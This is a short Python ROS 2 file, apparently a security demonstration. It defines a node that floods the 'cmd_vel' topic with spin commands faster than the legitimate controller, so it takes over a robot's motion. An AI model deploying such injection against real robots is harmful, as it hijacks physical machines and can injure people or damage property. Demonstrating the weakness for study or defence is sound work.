# security_examples/command_injector.py
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist

class CommandInjectorNode(Node):
    def __init__(self):
        super().__init__('command_injector')
        self.publisher_ = self.create_publisher(Twist, 'cmd_vel', 10)
        timer_period = 0.1  # seconds, publish faster than the legitimate node
        self.timer = self.create_timer(timer_period, self.timer_callback)
        self.get_logger().warn('!!! Command Injector Node ACTIVE!!!')

    def timer_callback(self):
        msg = Twist()
        msg.linear.x = 0.0
        msg.angular.z = 1.5  # Schnelle Drehung
        self.publisher_.publish(msg)

def main(args=None):
    rclpy.init(args=args)
    command_injector = CommandInjectorNode()
    rclpy.spin(command_injector)
    command_injector.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()